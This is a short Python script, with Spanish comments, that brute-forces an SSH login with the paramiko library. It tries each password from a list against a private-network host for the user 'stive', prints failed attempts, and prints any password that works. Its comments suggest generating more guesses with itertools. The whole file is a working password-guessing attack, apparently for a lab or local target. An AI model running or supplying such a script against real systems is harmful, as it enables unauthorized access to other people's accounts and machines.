import paramiko
import itertools

def brute_force_ssh(host, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password)
            print(f"Contraseña encontrada: {password}")
            ssh.close()
            break
        except Exception as e:
            print(f"Intento fallido con contraseña: {password}")

# Configuración
ssh_host = "192.168.18.249"
ssh_username = "stive"
# Puedes proporcionar una lista de contraseñas o generar combinaciones utilizando itertools
password_list = ["contrasena1", "contrasena2", "123456"]

# Llamada a la función de fuerza bruta
brute_force_ssh(ssh_host, ssh_username, password_list)
